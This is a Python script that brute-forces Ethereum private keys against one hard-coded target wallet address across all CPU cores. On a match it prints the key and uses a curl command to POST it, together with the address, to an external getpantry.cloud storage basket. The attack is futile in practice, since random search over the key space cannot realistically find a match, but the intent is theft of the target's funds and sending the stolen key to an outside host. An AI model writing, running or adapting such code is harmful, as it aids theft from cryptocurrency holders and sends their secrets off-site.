import os
import ecdsa
from Crypto.Hash import keccak
from concurrent.futures import ProcessPoolExecutor, as_completed
import multiprocessing
import subprocess
import json

def keccak256(data):
    """Calculate the Keccak-256 hash."""
    k = keccak.new(digest_bits=256)
    k.update(data)
    return k.digest()

def generate_eth_address():
    """Generate a random Ethereum address and its corresponding private key."""
    # Generate a random 32-byte (256-bit) private key
    private_key = os.urandom(32)  # Secure random number generator
    # Generate public key from the private key
    signing_key = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    public_key = signing_key.get_verifying_key().to_string()
    # Calculate Ethereum address from the public key (last 20 bytes of Keccak-256 hash of public key)
    eth_address = '0x' + keccak256(public_key)[-20:].hex()
    return private_key.hex(), eth_address

def check_address(target_address):
    """Continuously generate Ethereum addresses and check if they match the target."""
    while True:
        private_key, eth_address = generate_eth_address()
        if eth_address.lower() == target_address.lower():  # Check for match (case-insensitive)
            return private_key, eth_address

def post_to_pantry(private_key, eth_address):
    """Post the private key and Ethereum address to the Pantry API."""
    data = {
        "user": {
            "id": 123,
            "name": "John Doe",
            "email": "john.doe@example.com"
        },
        "private_key": private_key,
        "eth_address": eth_address,
        "notes": "Match found!"
    }
    # Convert data to JSON string
    json_data = json.dumps(data)

    # Execute the curl command to post data
    curl_command = [
        'curl', '-X', 'POST', '-H', 'Content-type: application/json', 
        '-d', json_data, 
        'https://getpantry.cloud/apiv1/pantry/123581d0-cf4c-48d2-b426-904e8e6ef00f/basket/testBasket'
    ]
    
    subprocess.run(curl_command)

def brute_force(target_address, num_workers):
    """Brute-force the private key using multiprocessing."""
    with ProcessPoolExecutor(max_workers=num_workers) as executor:
        futures = [executor.submit(check_address, target_address) for _ in range(num_workers)]
        
        for future in as_completed(futures):
            private_key, eth_address = future.result()
            print(f"Match found!")
            print(f"Private Key: {private_key}")
            print(f"Ethereum Address: {eth_address}")
            # Post the found private key and address to the Pantry API
            post_to_pantry(private_key, eth_address)
            return

if __name__ == "__main__":
    # The target Ethereum address you want to match
    target_address = '0x21a31Ee1afC51d94C2eFcCAa2092aD1028285549'
    
    # Number of CPU cores to use (set to max available)
    num_workers = multiprocessing.cpu_count()

    print(f"Starting brute force with {num_workers} workers...")
    brute_force(target_address, num_workers)
